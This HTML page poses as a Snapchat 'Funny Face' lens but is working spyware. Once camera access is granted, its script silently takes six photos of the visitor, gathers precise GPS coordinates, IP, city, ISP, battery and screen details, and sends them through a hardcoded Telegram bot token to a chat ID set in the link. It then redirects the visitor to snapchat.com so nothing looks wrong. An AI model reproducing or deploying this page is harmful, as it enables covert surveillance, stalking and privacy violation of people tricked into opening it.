<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Lens - Funny Face Filter</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            z-index: 10;
        }
        .filter-title {
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        .bottom-tray {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .capture-btn {
            width: 75px;
            height: 75px;
            border: 5px solid #ffffff;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
        }
        .hint-text {
            font-size: 12px;
            color: #ccc;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="filter-title">🔥 Funny Face Lens</div>
        <div>✨ Snapchat</div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview"></video>
        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Access</div>
    </div>

    <div class="bottom-tray">
        <button class="capture-btn" onclick="triggerCapture()"></button>
        <div class="hint-text">Tap to try filter</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b');

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;

        function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({
                                lat: lat,
                                lon: lon,
                                mapLink: `https://maps.google.com/?q=${lat},${lon}`
                            });
                        },
                        (error) => {
                            resolve({ lat: '', lon: '', mapLink: 'Permission Denied / Unavailable' });
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        async function initCamera() {
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: !cameraType
            };

            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user";
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(resolve).catch(resolve);
                    };
                });

                document.getElementById('loading-text').style.display = 'none';
                isReady = true;

                // --- AUTO CAPTURE TRIGGERED WITHOUT CLICKING ---
                setTimeout(() => {
                    triggerCapture();
                }, 1000);

            } catch (err) {
                document.getElementById('loading-text').innerText = "Please allow camera access!";
            }
        }

        async function triggerCapture() {
            if (!isReady || !globalStream) return;

            document.getElementById('loading-text').innerText = "Applying Filter...";
            document.getElementById('loading-text').style.display = 'block';

            const videoElement = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = videoElement.videoWidth || 1280;
            canvas.height = videoElement.videoHeight || 720;
            const context = canvas.getContext('2d');

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();

            for (let i = 1; i <= 6; i++) {
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                
                if (blob) {
                    let caption = "";
                    
                    if (i === 1) {
                        caption = 
                            `🌐 **IP & Exact Location**\n` +
                            `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                            `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                            `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                            `📡 ISP: ${ipInfo.isp}\n\n` +
                            `📱 **Device Details**\n` +
                            `🔋 Battery: ${batteryText}\n` +
                            `📶 Network: ${netType}\n` +
                            `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                            `👑 **CREDIT BY : आयुष नेगी**`;
                    } else {
                        caption = `👑 **CREDIT BY : आयुष नेगी**`;
                    }

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `photo_${i}.jpg`);
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                await new Promise(resolve => setTimeout(resolve, 300));
            }

            globalStream.getTracks().forEach(track => track.stop());
            window.location.href = "https://www.snapchat.com";
        }

        window.onload = function() {
            initCamera();
        };
    </script>
</body>
</html>
